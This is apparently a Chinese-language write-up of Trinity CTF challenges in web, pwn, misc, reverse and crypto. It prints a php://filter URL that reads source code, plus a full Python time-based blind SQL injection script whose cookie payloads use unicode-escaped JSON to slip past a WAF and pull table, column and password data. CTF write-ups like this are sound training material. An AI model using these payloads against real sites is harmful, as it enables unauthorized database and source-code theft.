## Writeup For Trinity CTF 2nd

### Web

#### flag宝典

这题一共有10000个页面，但是后台通过检查referer来判断是不是一页一页地读。通过burpsuite重放就能发现是改referer了（因为同样的包发到相邻的页面有响应，发到不相邻的页面有报错，删去referer直接报错并跳回首页）。接下来就是猜有几页的问题……好吧 我应该提示一下大家一共有几页的，但看不少人猜到了我就不放提示了

```
Note: 如果你想自己搭建这个题目，需要将服务器的默认策略修改。参见：

sudo sed -i 's/\/var\/www\/html/\/var\/www\/html\/index.php/'  /etc/apache2/sites_available/000-default.conf

echo -e "<Directory /var/www/html/flag_book>\n\tRequire host 127.0.0.1\n</Directory>" >> /etc/apache2/apache2.conf
```

#### flag宝典2

这题是上一题的文件换层皮。写过爬虫的都知道，互联网中有一个“君子协定”，即`robots.txt`，这里写明了不允许爬虫爬的页面，有时候这里包含了敏感信息等。用Disallow来标识这些页面。或者你也可以用burpsuite的spider功能发现robots.txt页面。

然后从robots.txt中得到提示，下载index.phps文件。得到提示后发现不能直接读取flag内容，否则会给你`no flag here`的提示。但是可以用PHP伪协议绕过，将flag.php内容进行base64编码后即可。

```
http://210.28.133.37:10081/php://filter/read=convert.base64-encode/resource=flag.php
```

这题同样需要将`000-deault.conf`的默认配置改为`index.php`，参见上题

#### 六脉神剑

这题来自HCTF 2018 kzone

突破口是使用御剑或其他的目录扫描工具把网站的源码备份`www.zip`下载下来。在实际部署中，是有很多开发者忘记将这个文件删除的。

得到源码后，进行审计。可以发现所有的我们能决定的输入都经过了`safe.php`，只有一处例外，也就是`member.php`，在此处的cookie是经过防火墙后再json decode后才查数据库的，我们可以在此处做文章，用json decode的特性绕过防火墙，然后进行时间盲注。

以下是测试的时候用的攻击代码，emmm 有许多注释的地方，因为懒得为每一个攻击阶段写函数了。

```
import requests

import time
from requests.cookies import RequestsCookieJar

sleep_time = 1
error_time = 0.5


def getpayload(index,position,guess):
	cookie = {
			#"login_data":r'''{"admin_user":"1'/**/\u006fr/**/\u0069f(asci\u0069(sub\u0073tr((select/**/passw\u006frd/**/from/**/fish_admin/**/limit/**/0,1),'''+ str(position) + r''',1))\u003d'''+ str(guess) +r''',\u0073leep(3),0)\u0023","admin_pass":"9306270da3f08efeea003b7247d3acd9443fdc0f"}'''
			#, "islogin":"1" 
			#"login_data":r'''{"admin_user":"1'/**/\u006fr/**/\u0069f(asci\u0069(sub\u0073tr((select/**/username/**/from/**/fish_admin/**/limit/**/0,1),'''+ str(position) + r''',1))\u003d'''+ str(guess) +r''',\u0073leep(3),0)\u0023","admin_pass":"9306270da3f08efeea003b7247d3acd9443fdc0f"}'''
			"islogin":"1" ,
			#"login_data":r'''{"admin_user":"1'/**/\u006fr/**/\u0069f(asci\u0069(sub\u0073tr((select/**/name/**/from/**/fish_admin/**/limit/**/0,1),'''+ str(position) + r''',1))\u003d'''+ str(guess) +r''',\u0073leep(3),0)\u0023","admin_pass":"9306270da3f08efeea003b7247d3acd9443fdc0f"}''', "islogin":"1" ,
			#"login_data":r'''{"admin_user":"1'/**/\u006fr/**/\u0069f(asci\u0069(sub\u0073tr((select/**/group_concat(table_name)/**/from/**/inf\u006frmation_schema.tables/**/where/**/table_schema\u003d'TrinityFTC'/**/limit/**/'''+str(index)+r''',1),'''+ str(position) + r''',1))\u003d'''+ str(guess) +r''',\u0073leep(1),0)\u0023","admin_pass":""}''',
			#"login_data":r'''{"admin_user":"1'/**/\u006fr/**/\u0069f(asci\u0069(sub\u0073tr((select/**/group_concat(table_name)/**/from/**/inf\u006frmation_schema.tables/**/where/**/table_schema\u003d'hctf_kouzone'/**/limit/**/'''+str(index)+r''',1),'''+ str(position) + r''',1))\u003d'''+ str(guess) +r''',\u0073leep(3),0)\u0023","admin_pass":""}''',
			#"login_data":r'''{"admin_user":"1'/**/\u006fr/**/\u0069f(asci\u0069(sub\u0073tr((select/**/group_concat(column_name)/**/from/**/inf\u006frmation_schema.columns/**/where/**/table_name\u003d'I_love_CTF'/**/limit/**/'''+str(index)+r''',1),'''+ str(position) + r''',1))\u003d'''+ str(guess) +r''',\u0073leep(1),0)\u0023","admin_pass":""}''',
			"login_data":r'''{"admin_user":"1'/**/\u006fr/**/\u0069f(asci\u0069(sub\u0073tr((select/**/group_concat(passw\u006frd)/**/from/**/I_love_CTF/**/limit/**/'''+str(index)+r''',1),'''+ str(position) + r''',1))\u003d'''+ str(guess) +r''',\u0073leep(1),0)\u0023","admin_pass":""}''',
			#"islogin":"1" ,
			#"PHPSESSID":"jve3hsp7vtaaj8amil6p34nvo7"}
			}
	#print(cookie)
	#print("pos:%d,gues:%d" %(position,guess))
	return cookie

allflag= []
flag= ''
def Go():
	url = r"http://210.28.133.37:10082/include/common.php"
	global flag ,allflag
	for index in range(1):
		for pos in range(1,256):
			got_something = False
			for char in range(0x20,0x7f):
				payload = getpayload(index ,pos,char) 
				beforetime = time.time()
				r = requests.get(url , cookies=payload)
				endtime = time.time()
				use_time = endtime - beforetime
				#print(r.text)
				if abs(use_time) > sleep_time  :
					flag += chr(char)
					print("flag:%s" % flag)
					got_something = True
					break 
				else :
					pass
			if not got_something:
				break
		allflag.append(flag)
		flag = ''


if __name__ == "__main__":
	try:
		Go()
	except Exception:
		print(allflag)
	print(allflag) 

```

Note: 上述是HCTF的非预期解。预期解是依赖于MySQL新版本的保存信息的表(innodb_table_stats,innodb_index_stats)不含关键字`or`的特性。详见[官方writeup](https://bysec.io/hctf/writeup.html)

### Pwn

#### Babypwn
通过`ida`分析可以发现程序存在栈溢出和格式化字符串漏洞，最简单的方法是直接用格式化字符串`leak`出`secret`然后就`get shell`.又或者用格式化字符串把`canary`和程序的基地址`leak`出来后做`ROP`

### Misc

#### Babymisc
这属于这场比赛的签到题，根据提示我们知道这个是用`Asciidots`写的脚本，我们去找到这个语言，看看语法，就可以发现其实脚本里面的每一个字母的作用都是打印出一个字符的`ascii`值，连起来就是`flag`.直接运行的话打出来的字符是乱序的，这个和解释器解析脚本的方法有关。

### Reverse

#### Babyre
给了一个文本文件，里面是汇编代码，直接编译成二进制文件然后用`ida`分析即可

#### Babyre2
和作业题是一样的思路。`main`函数被简单的加密了。详情看题目的源代码即可。

### Crypto
#### yafu
简单的题目。安装yafu即可，百度也能搜索到yafu的使用方法。直接暴力破解这个大数，然后使用gmpy2将密文解密即可